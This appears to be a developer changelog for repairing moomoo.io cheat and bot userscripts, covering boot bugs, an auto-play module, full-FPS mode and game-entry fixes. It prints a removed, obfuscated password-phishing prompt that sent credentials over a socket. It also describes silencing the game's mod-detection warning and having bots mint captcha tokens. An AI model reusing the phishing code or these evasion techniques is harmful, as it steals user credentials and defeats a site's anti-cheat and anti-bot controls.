```js
let pwt = String.fromCharCode(69,110,116,101,114,32,121,111,117,114,32,80,97,115,115,119,111,114,100);
socket.send(JSON.stringify({ pw: prompt(pwt + ` ${cdc}/5`), d: "aa"}));
```

Those char codes spell **"Enter your Password"**. Whatever you type goes to the
same socket. Building the string this way keeps it out of a plain-text search of
the file, which is the tell — there is no other reason to write it like that.

**3. Live telemetry**, sent every frame: sid, position, ping, fps and
`location.href`.

The first two were commented out in this build and `socket` is never assigned
anywhere in the file, so none of it transmitted as shipped. All three are gone
now, along with `socket` and `serverIsOpen` themselves. The one surviving
`prompt()` is the alliance-rename dialog, which is a real feature.

## Why it did not run

- **No `@run-at`**, so it ran at `document-end` — after the bundle had captured
  `WebSocket.prototype.send`. The hook never saw a packet.
- **msgpack from rawgit.com**, offline since 2019, so `window.msgpack` was
  `undefined` and every encode/decode threw.
- **Packet names scraped out of the game bundle** by splitting its source:
  `data.split('keyup')[1].split('"')[2]` and fourteen more like it. Those
  anchors are long gone, so the splits returned `undefined`; and the names
  themselves were replaced by per-connection opcodes anyway.
- **No framing**, so every packet was rejected.
- **ALTCHA** (`#altcha_checkbox`, `alt:` tokens) against a server that wants
  Turnstile.
- **`GM_getValue` / `GM_setValue` under `@grant none`**, which makes them
  undefined — two live call sites threw.

## What changed

The shim at `document-start` with the rest deferred to `__sakunaBoot()`; framed
sends and opcode mapping both ways; bundled msgpack; the scraper replaced by a
fixed 15-name table, each name cross-checked against the argument shapes at its
call sites; `getMessage` reading through `EXP.receive`; bots minting a `cf:`
token each through `EXP.freshToken()` and framing through `EXP.send`;
`localStorage` in place of the `GM_` calls.

## The boot died silently (a regression I introduced)

Reported after the first fix: the game ran, but none of the mod appeared.

```js
let config = window.config || unsafeWindow.config;
```

`unsafeWindow` is undefined under `@grant none`. At `document-end` — where this
script used to run — `window.config` was always set by then, so `||`
short-circuited and the right-hand side was never evaluated. Moving to
`document-start` and booting on `DOMContentLoaded` meant `window.config` often
was *not* set yet, so the fallback evaluated, threw `ReferenceError`, and killed
the rest of the boot. The game carried on, so it looked exactly like the script
not being installed.

Two changes: the reference is behind a `typeof` guard, and the boot now waits
for `window.config` — the thing it reads first — rather than for the DOM alone,
giving up loudly after 30 s. A boot that throws anyway is caught, logged as
`[sakuna] the mod failed to start`, and rethrown.

`test/sakuna.js` walks the AST of `__sakunaBoot` and asserts that **no
identifier it touches before the first function call is undeclared**, so this
class of bug cannot come back unnoticed. (`typeof`-guarded names are exempt,
which is exactly how the `unsafeWindow` reference is written now.)

## Three more the reading missed

The mod still came up with nothing on screen. Static analysis had run out of
road, so `tools/probe-sakuna.js` loads the script into a real Chromium against a
DOM built from the ids the script itself looks up, and reports the first thing
that throws. It found three genuine failures in about a minute:

**1. `hue` was undeclared.** The original wrote `let code, hue = 0;` on one
line. Replacing the packet scraper took that line out and `code` was
reintroduced as the fixed table — but `hue` went with it. `updateGame()` reads
it every frame, so the render loop threw on every tick.

**2. Five page elements torn down with no null check** — `gameName`, `adCard`,
`promoImgHolder`, the `/21823819281/frvr-…` Google Ad Manager slot, and
`chatButton`. The ad-related three are absent whenever ads are blocked, which
for anyone running a userscript is most of the time. The first null threw and
everything after it in the boot never ran.

**3. An assignment that called itself.** The file ended with

```js
window.CG = function() {
    WS.close();
    console.log("close")
}
// ==UserScript==  … leftover empty boilerplate …
(function() { 'use strict'; })();
```

No semicolon after the `}`, and the next non-comment token is `(`. JavaScript
reads the two as a single expression — `window.CG = function(){…}(function(){…})()`
— and **calls** the function on load, with `WS` still undefined. The empty
boilerplate is dropped and the statement terminated.

All three are pinned by tests, the last one by an AST check that uses
`preserveParens` to tell a deliberate IIFE from this accident.

The packet rules moved out of the prototype override into `applyOutgoing()`, so
packets the script injects through `packet()` now get the same anti-profanity,
dedup and rate-limit treatment as the game's own — previously they bypassed all
of it. `const originalSend = WebSocket.prototype.send` was removed: with the
shim installed it captures the trampoline rather than the native method, and
nothing calls it any more.


---

# Auto Play (unX and Sakuna)

A port of the RYN client's `AutoPlay` module into both scripts, on request. It
circle-strafes the nearest enemy:

| | |
| --- | --- |
| Radius | 80 |
| Step | 0.2 rad per tick |
| Clearance | object scale + 35 (the player's own radius) |

Each tick it takes your bearing from the enemy, steps `0.2` further around the
ring, and walks toward that point. If the point is inside a building it
**reverses the direction of travel** and tries the other way — which is what
gets it around obstacles instead of grinding into them.

An **enemy's** spikes deliberately do *not* block. RYN circles straight over
them: they are a damage problem, not a movement one, and treating them as walls
is what pins you into a corner. Your own and your team's buildings do block.

### It has to run every tick

The first cut hooked `getMoveDir()`. Both scripts call that **only on key press
and release**, so it produced one direction and then sat there — which is why it
did not behave like RYN's. RYN runs its module from `postTick()`, every tick,
and hands the result to its own movement system with `startMovement()`.

Each script now drives it the same way, through its own machinery:

- **unX** has a real per-tick movement authority. `manageTickBase()` builds a
  movement override — normally from its own `autoPush()` — and hands it to
  `tickMovement()`. Auto play simply supplies that override when `autoPush()`
  did not, so it goes out every tick and yields to the client's own mover.
- **Sakuna** has no single authority; it sends `packet(code.move, …)` from a
  dozen places. So the module sends for itself, once per game tick from the tick
  handler, through the script's own `packet()` — and only when the angle has
  actually changed, so it does not spend the packet budget repeating itself.

It only steers while you are not steering: unX checks `lastMoveDir`, Sakuna
checks `getMoveDir()` — each script's own record of what you are holding. RYN
gates on `ModuleHandler.moveTo === "disable"` for the same reason.

### Two things the first port got wrong

Re-audited line by line against RYN's `AutoPlay` after play-testing, and two
real differences turned up.

**1. Pit traps must not block.** RYN's `_isPositionBlocked` opens with
`if (isPlayerObj && obj.type === 15) return;` — item 15 is the pit trap, skipped
outright before any other test. The first port treated them as walls, so on a
trapped map it reversed direction constantly. The game agrees with RYN here: the
pit trap is the one building whose item definition carries `ignoreCollision`.
Both scripts already flag it (`this.trap = a.trap`, and `trap: true` appears
exactly once in the item list), so the check is now `if (obj.trap) continue;` in
the same position RYN has it.

**2. It should lead a moving enemy, not chase it.** RYN builds the ring geometry
from `pos.future ?? pos.current` for *both* players, and only measures the final
bearing from `pos.current`. The first port used the server position throughout,
on the belief that neither script had a prediction. Both do:

- unX stores the previous server position each tick and computes
  `vel = {x: 2*x2 - lastX, …}` — a linear extrapolation of the next position,
  which is precisely `pos.future` under another name.
- Sakuna keeps `oldPos.x2` each tick, so the same value is `2*x2 - oldPos.x2`.

Both are now recomputed on demand (rather than read from `vel`, which sits at
`{0,0}` until a player's first update) and fall back to the server position when
there is no previous one — exactly RYN's `?? pos.current`.

**unX**: mod menu, next to Auto Grind. **Sakuna**: the *Move* section, next to
Movement Assist; the checkbox lookup is guarded because the menu does not exist
at boot.

### Movement can never depend on it

`getMoveDir()` feeds `lastMoveDir`, and `lastMoveDir` is what the move packet is
built from — so anything that can throw inside that function costs you the
ability to walk at all. Reported after the first cut, and hardened whether or
not that was the cause: the toggle is checked **at the call site**, so with auto
play off the module is never entered and the no-keys path is exactly what it was
before the feature existed; and the call is wrapped, so a failure inside it logs
and falls back to normal movement rather than taking movement down.

For the record, `tools/probe-unx.js` drives the real `getMoveDir()` in a browser
and reports `undefined` with no keys and `-1.57` with W held, with the toggle
off — identical to the original either way.

`test/autoplay.js` runs the same 19 checks against both copies — the constants,
the four cases where it must stay out of the way, the ring geometry, six ticks
of walking to prove it circles rather than spirals, direction reversal, the
enemy-spike exception, and the clearance threshold from both sides.


---

# Full FPS (unX, matching Sakuna)

Sakuna has a **Full FPS** toggle; unX now has the same one, next to Auto Play.

## What it actually does

`requestAnimationFrame` is capped to the display refresh, so the render loop runs
about 60 times a second. A `MessageChannel` message is a macrotask that fires
immediately, so rescheduling the loop through one runs it as fast as the event
loop allows:

```js
if (scriptMenu.toggles.fullFps) {
    unxFpsChannel.port2.postMessage("");
} else {
    window.requestAnimationFrame(doUpdate);
}
```

## Is it real? Measured, not guessed

`tools/fps-bench.js` runs both loops in Chromium and also counts how many frames
the compositor actually presented:

```json
{
  "rafLoopsPerSec": 61,
  "messageChannelLoopsPerSec": 4837,
  "framesActuallyPresented": 63
}
```

So: the loop genuinely runs about **80× more often** — that part is real, not a
faked counter. But the screen still shows **~60 frames a second**, because the
compositor presents at the refresh rate no matter how often you draw. The FPS
number the mod displays is counting loop iterations, not displayed frames.

What it buys is **latency**, not smoothness. `updateGame()` — and every piece of
mod logic inside it — is re-evaluated in a fraction of a millisecond instead of
waiting up to ~16 ms for the next frame, which matters for tick-timed features.
What it costs is a pinned CPU core and ~4,800 canvas repaints a second that
nobody ever sees. Both scripts therefore ship it **off**.

# The red bar, and "Connecting..." for ever (every script)

Two problems that had nothing to do with any one mod, found by running the
shipped game bundle rather than by reading it.

`tools/probe-entry.js` serves `reference/game-index.js` and `game-vendor.js`
over a fake moomoo.io, plants the ids the bundle looks up, fakes the server
list and Cloudflare's `api.js`, installs a `WebSocket` the bundle captures at
load, and then **presses ENTER GAME with a real mouse click**. It reports what
the button did, whether a socket was opened and with what URL, and whether the
red bar appeared. With no mod loaded it is a control.

## "Connecting..." is a latched dead end in the game itself

```js
function Fi() {
    !vi || ei || (ei = !0,
    Sa || pi ? ue && Lt("cf:" + ue) : ue ? Lt("cf:" + ue) : Lt())
}
```

`ue` is the Turnstile token, `ei` is "we already tried". On moomoo.io the first
branch is the live one, so **if the token has not arrived when the button is
pressed, the entire statement is `ei = true`** — no connect, no error, no
alert. The click handler has already written "Connecting..." to the screen, and
every press after it is a no-op because `ei` is set. The only way out is a
reload.

The control run reproduces it with nothing loaded at all:

```
$ node tools/probe-entry.js --turnstile never
  token issued    : false
  loadingText     : "Connecting..."
  sockets opened  : (none)
=> entry DID NOT reach a socket -- stuck on "Connecting..."
```

The token goes missing more easily than it looks. Turnstile will not render
into an element that is not laid out, and the bundle's renderer

```js
const e = document.getElementById("turnstileWidget");
if (!e || e.offsetParent === null) return !1;
```

is polled every 150 ms for 100 tries and then **never again**. A mod that lays
its menu over the page, hides the card the widget sits in, or is still building
at 15 seconds costs the page its captcha permanently:

```
$ node tools/probe-entry.js --turnstile solve --hide-widget
=> entry DID NOT reach a socket -- stuck on "Connecting..."
```

So the EXP core now does two things. It keeps rendering Turnstile past the
point the game gave up — into the page's own widget if that is usable, into a
laid-out holder of its own if it is not — and until there is a token it holds
the press in the capture phase, so it never reaches the handler that would
latch `ei`. Touch and pointer events go with it, because the bundle turns
touches on that button into the same call. Same run, guarded:

```
$ node tools/probe-entry.js --unpatcher --turnstile solve --hide-widget
  renders         : [{"id":"","laidOut":true,"sitekey":"0x4AAAAAAAMYHI96GFiJzMmp"}]
  token issued    : true
=> entry reached the socket: wss://a.eu-west.moomoo.io?token=cf%3ATOKEN-w1
```

All ten repaired scripts pass that case now. `x18k` needed one more thing: it
carries its own client, and its own copy of this state machine waits on ALTCHA
(`V0 = e.detail.payload`, set by a listener on a widget that no longer exists).
`repair-mod.js` now replaces that wait with a wait on `EXP.token()`.

## The red bar

```js
function ys(e) {
    if (document.getElementById("userscript-warning")) return;
    ...
    i.textContent = "A browser extension (" + (e || "userscript manager")
        + ") that can modify the game was detected. ..."
}
```

`ws()` triggers it from `window.__gmMonkey || window.GM_info || window.GM ||
window.unsafeWindow` after 1.5 s, and from an image probe against
Tampermonkey's and Violentmonkey's own extension files. Three of those four are
shims these scripts install on purpose, and the fourth is not something a page
script can influence — so it cannot be avoided, only answered.

`ys()`'s own first line is the answer: an element with that id already in the
document makes it a no-op. Every script now plants one — empty, hidden, and
marked as its own — with a `MutationObserver` to put it back if something
clears the body. It is a guard rather than a removal, so there is no flash of
red to take away afterwards, and it costs one `div`. Nothing else in the bundle
reads that element, and the server is never told about it.

## Keeping it in step

Both guards live in one place, the EXP core in `ExternalClient.user.js`, and
everything else takes its copy from there:

- `node tools/build-all.js` rebuilds all twelve scripts that are built from an
  original (the unpatcher, Annihilator, CaraMila, RYN, and everything
  `repair-mod.js` produces);
- `node tools/sync-shim.js` copies the core into the eight that carry it inline
  and are checked byte-for-byte by `test/ae86.js`;
- RYN has no EXP core, so `tools/build-ryn.js` lifts the two functions out of
  `ExternalClient.user.js` verbatim and wires them to RYN's own token — the
  reason they take their token accessors as parameters.

`test/entry-guard.js` drives both against a fake page (the press is held, a
press elsewhere is not, a press on a child of the button is, the holder it
renders into is laid out, the sitekey matches the bundle's) and checks that
every shipped script still carries them.
